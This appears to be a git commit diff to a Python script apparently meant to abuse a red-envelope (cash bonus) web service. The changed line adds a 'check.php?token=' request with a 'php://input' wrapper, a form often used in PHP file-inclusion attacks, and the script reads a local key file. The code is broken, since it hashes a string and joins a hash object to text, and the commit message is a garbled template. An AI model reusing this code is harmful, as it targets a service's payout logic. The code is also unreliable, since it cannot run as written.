5ef4fcd6414d4ea1e46f5c78f75a86b4e0239176
whb54012 <1226844928@qq.com>
2026-08-15 06:16:44 +0000

    自动提交：更新 ${2026/8/15 14:16ilenPM16e}

--- python/红包6脚本.py
+++ python/红包6脚本.py
@@ -1,6 +1,6 @@
 import requests,threading,hashlib
 minute=hashlib.md5(input("输入时分"))
-url=input("输入网址")
+url=input("输入网址")+"/check.php?token="+minute+"&php://input"
 with open("C:\\Users\\whb\\Downloads\\key (1).dat","rb")as f:
     data1=f.read()
     data2="mmmmmmm"
